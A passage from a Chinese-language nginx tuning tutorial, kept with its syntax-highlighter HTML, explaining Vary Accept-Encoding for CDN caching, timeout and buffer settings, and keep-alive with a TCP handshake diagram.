class=\"crayon-s\">\"/sites/netguru/style.css\"</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29791d343132829301-4\">  <span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29791d343132829301-5\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0008 seconds] -->\r\n<p>然后将其返回给客户端。</p>\n<p>现在，新的浏览器发送相同的请求到 CDN，请求 netguru.co/style.css，获取 gzip 打包的资源。由于 CDN 仅通过 URI 标识资源，它将为新浏览器返回一样的未压缩资源。新的浏览器将尝试提取未打包的文件，但是将获得无用的东西。</p>\n<p>如果我们能够告诉公共缓存是怎样进行 URI 和编码的资源识别，我们就可以避免这个问题。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f29791d346305349162\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n{\r\n  ...\r\n  (netguru.co/styles.css, gzip) =&gt; FILE(\"/sites/netguru/style.css.gzip\")\r\n  (netguru.co/styles.css, text/css) =&gt; FILE(\"/sites/netguru/style.css\")\r\n  ...\r\n}\r\n``</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f29791d346305349162-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29791d346305349162-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29791d346305349162-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29791d346305349162-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29791d346305349162-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29791d346305349162-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29791d346305349162-7\">7</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f29791d346305349162-1\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29791d346305349162-2\">  <span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29791d346305349162-3\">  <span class=\"crayon-sy\">(</span><span class=\"crayon-v\">netguru</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">co</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">styles</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">css</span><span class=\"crayon-sy\">,</span> <span class=\"crayon-v\">gzip</span><span class=\"crayon-sy\">)</span> <span class=\"crayon-o\">=</span><span class=\"crayon-o\">&gt;</span> <span class=\"crayon-e\">FILE</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"/sites/netguru/style.css.gzip\"</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29791d346305349162-4\">  <span class=\"crayon-sy\">(</span><span class=\"crayon-v\">netguru</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">co</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">styles</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">css</span><span class=\"crayon-sy\">,</span> <span class=\"crayon-v\">text</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">css</span><span class=\"crayon-sy\">)</span> <span class=\"crayon-o\">=</span><span class=\"crayon-o\">&gt;</span> <span class=\"crayon-e\">FILE</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"/sites/netguru/style.css\"</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29791d346305349162-5\">  <span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29791d346305349162-6\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29791d346305349162-7\"><span class=\"crayon-sy\">`</span><span class=\"crayon-sy\">`</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0013 seconds] -->\r\n<p>这正是 Vary Accept-Encoding: 完成的。它告诉公共缓存，可以通过 URI 和 Accept-Encoding header 区分资源。</p>\n<p>所以我们的最终配置如下：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f29791d34a787350230\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nlocation ~* \\.(jpg|jpeg|png|gif|ico|css|js)$ {\r\n  expires 1M;\r\n  add_header Cache-Control public;\r\n  add_header Pragma public;\r\n  add_header Vary Accept-Encoding;\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f29791d34a787350230-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29791d34a787350230-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29791d34a787350230-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29791d34a787350230-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29791d34a787350230-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29791d34a787350230-6\">6</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f29791d34a787350230-1\"><span class=\"crayon-i\">location</span> <span class=\"crayon-o\">~</span><span class=\"crayon-o\">*</span> <span class=\"crayon-sy\">\\</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">jpg</span><span class=\"crayon-o\">|</span><span class=\"crayon-v\">jpeg</span><span class=\"crayon-o\">|</span><span class=\"crayon-v\">png</span><span class=\"crayon-o\">|</span><span class=\"crayon-v\">gif</span><span class=\"crayon-o\">|</span><span class=\"crayon-v\">ico</span><span class=\"crayon-o\">|</span><span class=\"crayon-v\">css</span><span class=\"crayon-o\">|</span><span class=\"crayon-v\">js</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">$</span> <span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29791d34a787350230-2\">  <span class=\"crayon-i\">expires</span> <span class=\"crayon-cn\">1M</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29791d34a787350230-3\">  <span class=\"crayon-v\">add</span><span class=\"crayon-sy\">_</span>header <span class=\"crayon-v\">Cache</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">Control</span> <span class=\"crayon-m\">public</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29791d34a787350230-4\">  <span class=\"crayon-v\">add</span><span class=\"crayon-sy\">_</span>header <span class=\"crayon-i\">Pragma</span> <span class=\"crayon-m\">public</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29791d34a787350230-5\">  <span class=\"crayon-v\">add</span><span class=\"crayon-sy\">_</span>header <span class=\"crayon-i\">Vary</span> <span class=\"crayon-v\">Accept</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">Encoding</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29791d34a787350230-6\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0015 seconds] -->\r\n<p></p>\n<h2>超时</h2>\n<p>client_body_timeout 和 client_header_timeout 定义了 nginx 在抛出 408（请求超时）错误之前应该等待客户端传输主体或头信息的时间。</p>\n<p>send_timeout 设置向客户端发送响应的超时时间。超时仅在两次连续的写入操作之间被设置，而不是用于整个响应的传输过程。如果客户端在给定时间内没有收到任何内容，则连接将被关闭。</p>\n<p>设置这些值时要小心，因为等待时间过长会使你容易受到攻击者的攻击，并且等待时间太短的话会切断与速度较慢的客户端的连接。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f29791d35c901874711\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# Configure timeouts\r\nclient_body_timeout   12;\r\nclient_header_timeout 12;\r\nsend_timeout          10;</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f29791d35c901874711-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29791d35c901874711-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29791d35c901874711-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29791d35c901874711-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f29791d35c901874711-1\"><span class=\"crayon-p\"># Configure timeouts</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29791d35c901874711-2\"><span class=\"crayon-v\">client_body</span><span class=\"crayon-sy\">_</span>timeout   <span class=\"crayon-cn\">12</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29791d35c901874711-3\"><span class=\"crayon-v\">client_header</span><span class=\"crayon-sy\">_</span>timeout <span class=\"crayon-cn\">12</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29791d35c901874711-4\"><span class=\"crayon-v\">send</span><span class=\"crayon-sy\">_</span>timeout          <span class=\"crayon-cn\">10</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0008 seconds] -->\r\n<p></p>\n<h2>Buffers</h2>\n<h3><code>client_body_buffer_size</code></h3>\n<p>设置读取客户端请求正文的缓冲区大小。如果请求主体大于缓冲区，则整个主体或仅其部分被写入临时文件。对 client_body_buffer_size 而言，设置 16k 大小在大多数情况下是足够的。</p>\n<p>这是又一个可以产生巨大影响的设置，必须谨慎使用。太小了，则 nginx 会不断地使用 I/O 把剩余的部分写入文件。太大了，则当攻击者可以打开所有连接但你无法在系统上分配足够缓冲来处理这些连接时，你可能容易受到 DOS 攻击。</p>\n<h3></h3>\n<h3><code>client_header_buffer_size</code> 和 <code>large_client_header_buffers</code></h3>\n<p>如果 header 不能跟 client_header_buffer_size 匹配上，就会使用 large_client_header_buffers。如果请求也不适合 large_client_header_buffers，将给客户端返回一个错误提示。对于大多数的请求来说，1KB 的缓存是足够的。但是，如果一个包含大量记录的请求，1KB 是不够的。</p>\n<p>如果请求行的长度超限，将给客户端返回一个 414（请求的 URI 太长）错误提示。如果请求的 header 长度超限，将抛出一个 400（错误请求）的错误代码</p>\n<h3><code>client_max_body_size</code></h3>\n<p>设置客户端请求主体的最大允许范围，在请求头字段中指定“内容长度”。如果您希望允许用户上传文件，调整此配置以满足您的需要。</p>\n<h3>配置</h3>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f29791d361706674406\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nclient_body_buffer_size       16K;\r\nclient_header_buffer_size     1k;\r\nlarge_client_header_buffers   2 1k;\r\nclient_max_body_size          8m;</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f29791d361706674406-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29791d361706674406-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29791d361706674406-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29791d361706674406-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f29791d361706674406-1\"><span class=\"crayon-v\">client_body_buffer</span><span class=\"crayon-sy\">_</span>size       <span class=\"crayon-cn\">16K</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29791d361706674406-2\"><span class=\"crayon-v\">client_header_buffer</span><span class=\"crayon-sy\">_</span>size     <span class=\"crayon-cn\">1k</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29791d361706674406-3\"><span class=\"crayon-v\">large_client_header</span><span class=\"crayon-sy\">_</span>buffers   <span class=\"crayon-cn\">2</span> <span class=\"crayon-cn\">1k</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29791d361706674406-4\"><span class=\"crayon-v\">client_max_body</span><span class=\"crayon-sy\">_</span>size          <span class=\"crayon-cn\">8m</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0010 seconds] -->\r\n<p></p>\n<h2>Keep-Alive</h2>\n<p>HTTP 所依赖的 TCP 协议需要执行三次握手来启动连接。这意味着在服务器可发送数据（例如图像）之前，需要在客户机和服务器之间进行三次完整的往返。</p>\n<p>假设你从 Warsaw 请求的 /image.jpg，并连接到在柏林最近的服务器：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f29791d365416415022\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nOpen connection\r\n\r\nTCP Handshake:\r\nWarsaw  -&gt;------------------ synchronize packet (SYN) -----------------&gt;- Berlin\r\nWarsaw  -&lt;--------- synchronise-acknowledgement packet (SYN-ACK) ------&lt;- Berlin\r\nWarsaw  -&gt;------------------- acknowledgement (ACK) -------------------&gt;- Berlin\r\n\r\nData transfer:\r\nWarsaw  -&gt;---------------------- /image.jpg ---------------------------&gt;- Berlin\r\nWarsaw  -&lt;--------------------- (image data) --------------------------&lt;- Berlin\r\n\r\nClose connection</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f29791d365416415022-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29791d365416415022-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29791d365416415022-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29791d365416415022-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29791d365416415022-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29791d365416415022-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29791d365416415022-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29791d365416415022-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29791d365416415022-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29791d365416415022-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29791d365416415022-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29791d365416415022-12\">12</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f29791d365416415022-1\"><span class=\"crayon-e\">Open </span><span class=\"crayon-e\">connection</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29791d365416415022-2\"> </div><div class=\"crayon-line\" id=\"crayon-5a6f29791d365416415022-3\"><span class=\"crayon-e\">TCP </span><span class=\"crayon-v\">Handshake</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29791d365416415022-4\"><span class=\"crayon-v\">Warsaw</span><span class=\"crayon-h\">  </span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">synchronize </span><span class=\"crayon-e\">packet</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">SYN</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Berlin</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29791d365416415022-5\"><span class=\"crayon-v\">Warsaw</span><span class=\"crayon-h\">  </span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">synchronise</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">acknowledgement </span><span class=\"crayon-e\">packet</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">SYN</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">ACK</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Berlin</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29791d365416415022-6\"><span class=\"crayon-v\">Warsaw</span><span class=\"crayon-h\">  </span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">acknowledgement</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">ACK</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Berlin</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29791d365416415022-7\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29791d365416415022-8\"><span class=\"crayon-e\">Data </span><span class=\"crayon-v\">transfer</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" 